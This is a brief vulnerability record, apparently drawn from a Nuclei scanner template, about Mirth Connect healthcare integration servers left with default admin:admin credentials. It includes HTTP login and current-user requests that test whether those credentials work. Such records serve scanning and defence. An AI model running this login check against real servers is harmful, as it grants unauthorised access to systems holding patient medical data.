# Vulnerability: Mirth Connect - Default Admin Credentials
**Classification:** CWE-798
**Source:** Nuclei Template (`mirth-connect-default-login.yaml`)

## Description
Detected Mirth Connect was using default credentials admin:admin. Mirth Connect is a widely used healthcare integration engine for HL7, FHIR, and other medical data standards.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/users/_login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

username={{username}}&password={{password}}

GET /api/users/current HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
```

